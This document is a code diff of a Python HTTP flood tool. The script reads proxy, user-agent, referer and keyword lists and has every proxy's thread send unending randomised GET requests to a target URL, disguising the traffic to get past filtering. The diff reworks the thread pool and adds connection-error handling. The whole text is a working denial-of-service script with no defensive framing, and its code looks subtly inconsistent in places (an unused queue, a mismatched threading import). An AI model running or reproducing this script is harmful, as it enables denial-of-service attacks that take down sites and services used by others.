@@ -6,9 +6,11 @@ import random
 import requests
 import time
 import string
-from threading import Thread  
+from queue import Queue
+from threading import Thread
 
 #naming the files
+
 proxy_file = 'proxy.txt'
 ua_file = 'user-agents.txt'
 ref_file = 'referers.txt'
@@ -54,24 +56,29 @@ except OSError:
 #
 print('Loaded: {} proxies, {} user-agents, {} referers, {} keywords'.format(len(ips), len(ua), len(ref), len(keyword)))
 print('Start sending requests...')
-
-def buildblock(size):
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
 	
-class HTTPThread(threading.Thread):
-	def run(self):
-		while True:
-			payload = {random.choice(keyword): random.choice(keyword)}
-			headers = {'User-Agent': random.choice(ua),
-				'Referer': url+'/?ref='+random.choice(keyword)}
-			index = random.randint(0,len(ips)-1)
-			proxies = {'http': ips[index]}
-			try:
-				r = requests.get(url, params=payload, headers=headers, proxies=proxies)
-			except Exception as ex:
-				pass
+def request(index):
+#	index = random.randint(0,len(ips)-1)
+	while True:
+		payload = {random.choice(keyword): random.choice(keyword)}
+		headers = {'User-Agent': random.choice(ua),
+			'Referer': url+'/'+random.choice(keyword)}
+		proxy = {'http': ips[index]}
+		try:
+			r = requests.get(url, params=payload, headers=headers, proxies=proxy)
+		except requests.exceptions.ChunkedEncodingError:
+			print('Server returned nothing(0 bytes). Breaking connection.')
+			break
+		except requests.exceptions.ConnectionError as err:
+			print('Connection error!')
+			break
 			
-
-for i in range(1000):
-	t = HTTPThread()
-	t.start()
+# Create the queue and thread pool.
+q = Queue()
+try:
+	for i in range(len(ips)):
+		t = threading.Thread(target=request, args=(i,))
+		t.start()
+except KeyboardInterrupt:
+	print('Stopping...')
+	sys.exit()
